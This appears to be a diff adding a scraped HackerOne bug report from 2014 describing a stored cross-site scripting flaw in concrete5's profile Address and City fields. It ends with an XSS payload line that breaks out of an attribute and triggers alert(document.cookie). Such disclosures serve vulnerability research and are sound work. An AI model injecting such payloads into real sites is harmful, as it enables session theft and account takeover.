@@ -1,0 +1,16 @@
+ReportLink:https://hackerone.com/reports/4839
+WeaknessName:Cross-site Scripting (XSS) - Generic
+Reporter:https://hackerone.com/atom
+ReportedTo:concrete5(concrete5)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:16.04.2014 10:48:51
+
+Summary:
+
+Proof: http://prntscr.com/348q0v
+
+1st: go to your profile
+Edit your Address and City and put this code
+"><img src=xonerror=alert(document.cookie)>
